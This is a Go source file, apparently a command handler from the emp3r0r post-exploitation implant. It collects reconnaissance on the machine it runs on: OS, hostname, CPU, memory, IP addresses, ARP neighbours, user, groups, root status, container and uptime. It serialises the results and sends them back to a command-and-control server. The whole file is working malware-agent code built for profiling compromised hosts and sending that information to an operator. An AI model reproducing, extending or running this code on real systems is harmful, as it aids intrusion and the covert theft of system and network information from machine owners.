package handler

import (
	"fmt"
	"os"

	"github.com/fxamacker/cbor/v2"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/agentutils"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
	"github.com/jm33-m0/emp3r0r/core/lib/sysinfo"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/spf13/cobra"
)

func sysinfoCmdRun(cmd *cobra.Command, args []string) {
	// Parse flags
	cpu, _ := cmd.Flags().GetBool("cpu")
	mem, _ := cmd.Flags().GetBool("mem")
	osInfo, _ := cmd.Flags().GetBool("os")
	net, _ := cmd.Flags().GetBool("net")
	user, _ := cmd.Flags().GetBool("user")
	container, _ := cmd.Flags().GetBool("container")
	uptime, _ := cmd.Flags().GetBool("uptime")
	full, _ := cmd.Flags().GetBool("full")

	var info *def.Emp3r0rAgent

	// Default to full if no specific flag is set
	if full || (!cpu && !mem && !osInfo && !net && !user && !container && !uptime) {
		info = agentutils.CollectFullSystemInfo()
	} else {
		// Granular collection - only collect what is requested
		info = &def.Emp3r0rAgent{}

		if osInfo {
			osDetails := sysinfo.GetOSInfo()
			info.OS = fmt.Sprintf("%s %s %s (%s)", osDetails.Vendor, osDetails.Name, osDetails.Version, osDetails.Architecture)
			info.Kernel = osDetails.Kernel
			info.Arch = osDetails.Architecture
			hostname, err := os.Hostname()
			if err != nil {
				hostname = "unknown_host"
			}
			info.Hostname = hostname
		}

		if cpu {
			info.CPU = util.GetCPUInfo()
		}

		if mem {
			info.Mem = fmt.Sprintf("%d MB", util.GetMemSize())
		}

		if net {
			info.IPs = netutil.IPa()
			info.ARP = netutil.IPNeigh()
			info.Transport = def.Transport
		}

		if user {
			u, g := agentutils.GetUserAndGroups()
			info.User = u
			info.Groups = g
			info.HasRoot = sysinfo.HasRoot()
		}

		if container {
			info.Container = agentutils.GetContainerName()
		}

		if uptime {
			info.Uptime = util.GetUptime()
		}
	}

	data, err := cbor.Marshal(info)
	if err != nil {
		c2transport.NotifyC2(cmd, "Error: %v\n", err)
		return
	}
	c2transport.NotifyC2Binary(cmd, data)
}
